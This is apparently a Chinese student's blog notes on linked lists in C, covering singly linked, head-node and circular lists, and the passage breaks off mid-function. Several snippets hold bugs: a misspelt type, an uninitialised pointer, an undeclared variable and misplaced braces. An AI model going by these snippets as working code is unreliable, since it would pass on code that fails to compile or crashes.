    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="线性表的链式存储"><a href="#线性表的链式存储" class="headerlink" title="线性表的链式存储"></a>线性表的链式存储</h2><p>线性表的存储方式：顺序存储 、链式存储</p><p>单链表  带头结点的单链表  循环单链表  双链表  特殊的线性表–栈和队列 的 链式存储实现</p><p>链式存储：指针 体现结点之间的逻辑关系  info   next</p><p><img src="https://i.loli.net/2021/09/25/o8ihcCZxbRSAPQ4.png" alt="image-20210925132250254"></p><hr><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p>结点包含 两个域：info域    next 指针域</p><p>必须含有一个首指针 指向单链表中的第一个结点  head</p><p><img src="https://i.loli.net/2021/09/25/3pCOcuU62fDqEWI.png" alt="image-20210925132456231"></p><h4 id="单链表的创建"><a href="#单链表的创建" class="headerlink" title="单链表的创建"></a>单链表的创建</h4><p><strong>前插法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建单链表 前插法</span></span><br><span class="line"><span class="function">node *<span class="title">creat_first</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入各个结点的值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        head = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>尾插法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后插法 创建单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *r = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输出各个结点的值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        <span class="keyword">if</span>(!head)</span><br><span class="line">            head = s;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="单链表的操作"><a href="#单链表的操作" class="headerlink" title="单链表的操作"></a>单链表的操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//建立一个空的链表</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找值是 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_x</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != x)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找 第 i 个结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_i</span><span class="params">(node *head,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j  = <span class="number">1</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">1</span>)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;\nError!&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; i!=j)</span><br><span class="line">    &#123;p = p-&gt;next;j++;&#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入 值为 x 的结点作为单链表的第一个结点  </span></span><br><span class="line"><span class="function">node *<span class="title">insert_begin</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = head;</span><br><span class="line">    head = p;  <span class="comment">//p 现在是第一个结点，头 head 换成 p</span></span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在单链表 第 i 个结点之后插入一个值为 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">insert_medium</span><span class="params">(node *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    q = find_i(head,i);<span class="comment">//查找第 i 个结点</span></span><br><span class="line">    <span class="keyword">if</span>(!q)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;找不到第 i 个结点，不能进行插入！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = q-&gt;next;</span><br><span class="line">    q-&gt;next = p;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在单链表最后位置插入结点 x</span></span><br><span class="line"><span class="function">node *<span class="title">insert_last</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    node *q;</span><br><span class="line">    q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    q-&gt;info = x;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next)&#123;  <span class="comment">//找到最后一个结点的位置，最后一个结点的 next 是 NULL</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;next = q;</span><br><span class="line">    q-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除单链表 结点</span></span><br><span class="line"><span class="function">node *<span class="title">delete_begin</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *pre = <span class="literal">NULL</span>,*p;</span><br><span class="line">    <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != x)&#123; <span class="comment">//如果删除的是中间的 用 pre 指向 p 原本的位置</span></span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!pre &amp;&amp; p-&gt;info == x)&#123; <span class="comment">//需要删除的是 第一个 结点</span></span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        pre-&gt;next = p-&gt;next; <span class="comment">//需要删除的是 中间的 结点</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链式存储 的插入与删除 比 顺序表方便，但不能随机去访问 某个结点</p><p>插入判满，删除判空！！！！！！！1</p><h3 id="带头结点的单链表"><a href="#带头结点的单链表" class="headerlink" title="带头结点的单链表"></a>带头结点的单链表</h3><p><img src="https://i.loli.net/2021/09/28/JTnbN5DRBp3eHLv.png" alt="image-20210928161355054"></p><h4 id="带头结点的单链表创建"><a href="#带头结点的单链表创建" class="headerlink" title="带头结点的单链表创建"></a>带头结点的单链表创建</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后插法 创建 带头结点的 单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head,*s,*r;</span><br><span class="line">datatype x;</span><br><span class="line">    head = r = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入单链表内容：（以 0 结尾）\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="带头结点的单链表操作"><a href="#带头结点的单链表操作" class="headerlink" title="带头结点的单链表操作"></a>带头结点的单链表操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head;</span><br><span class="line">    head = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出 带头结点的单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找第 i 个结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_i</span><span class="params">(node *head,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">0</span>) </span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;不存在第 %d 个结点！\n&quot;</span>,i);  <span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">0</span>)  <span class="comment">//刚好为头结点 由于是带头结点的单链表，则为 NULL</span></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; i!=j)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入操作 在 第 i 个 结点之后插入 x</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    q = find_i(head,i);</span><br><span class="line">    <span class="keyword">if</span>(!q) &#123;<span class="built_in">printf</span>(<span class="string">&quot;不存在第 %d 个结点！\n&quot;</span>,i); <span class="keyword">return</span> head;&#125;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = q-&gt;next;</span><br><span class="line">    q-&gt;next = p;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除操作</span></span><br><span class="line"><span class="function">node *<span class="title">delete</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    ndoe *pre = head,*q;</span><br><span class="line">    q = head-&gt;next;  <span class="comment">//由于是带头结点</span></span><br><span class="line">    <span class="keyword">while</span>(q &amp;&amp; q-&gt;info != x)&#123;</span><br><span class="line">        pre = q;   <span class="comment">//使 pre 始终指向 p 的前驱</span></span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q)&#123;</span><br><span class="line">        pre-&gt;next = q-&gt;next;  <span class="comment">//删除</span></span><br><span class="line">        <span class="built_in">free</span>(q);     <span class="comment">//释放空间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环单链表"><a href="#循环单链表" class="headerlink" title="循环单链表"></a>循环单链表</h3><p>如果仅仅是单链表的话，它只能从首指针开始，依次向后访问，而不能访问到它前面的结点，如果想要访问到任意的结点的话——&gt;循环单链表。</p><p>做法：设置表最后一个结点的指针域指向表中的第一个结点。</p><p>假设最后一个结点的位置是 p ，则 p-&gt;next = head;</p><h4 id="循环单链表的操作"><a href="#循环单链表的操作" class="headerlink" title="循环单链表的操作"></a>循环单链表的操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得 循环单链表 最后一个结点的 存储地址</span></span><br><span class="line"><span class="function">node *<span class="title">rear</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        p = <span class="literal">NULL</span>; <span class="comment">//循环单链表 为空</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        p = head;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;next != head)</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;循环单链表是空的！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;循环单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);  <span class="comment">//输出非空表中的 第一个 结点的值</span></span><br><span class="line">        p = head-&gt;next;<span class="comment">//使 p 指向第一个结点的下一个结点</span></span><br><span class="line">        <span class="keyword">while</span>(p != head)&#123;<span class="comment">//输出中间的结点值，直到回到第一个结点</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找 值 是 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_x</span><span class="params">(ndoe *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;循环单链表是 空的 ！\n&quot;</span>); <span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    q = head;</span><br><span class="line">    <span class="keyword">while</span>(q-&gt;next != head &amp;&amp; q-&gt;info != x)&#123;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;info == x)</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入操作</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    node *p,*q,*myrear;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;找不到指定位置！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span> &amp;&amp; !head)&#123;<span class="comment">//插入之前循环单链表是空的，则插入后指针应指向自己</span></span><br><span class="line">        p-&gt;next = p;</span><br><span class="line">        head = p;</span><br><span class="line">        <span class="keyword">return</span> head; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span> &amp;&amp; head)&#123;<span class="comment">//在非空的 循环单链表中  插入 到 最前面</span></span><br><span class="line">        myrear = rear(head);<span class="comment">//寻找 最后一个结点</span></span><br><span class="line">        p-&gt;next = head;<span class="comment">//将 p 作为 最后一个结点</span></span><br><span class="line">        myrear-&gt;next = p;</span><br><span class="line">        <span class="keyword">return</span> head;       </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; !head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法找到指定位置插入!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; head)&#123;<span class="comment">//在非空的 循环单链表中  插入 位置任意</span></span><br><span class="line">        q = head;</span><br><span class="line">        j = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i != j &amp;&amp; q-&gt;next != head)&#123;</span><br><span class="line">            q = q-&gt;next;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i != j)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;不存在第 %d 个结点，无法插入！&quot;</span>,i);</span><br><span class="line">            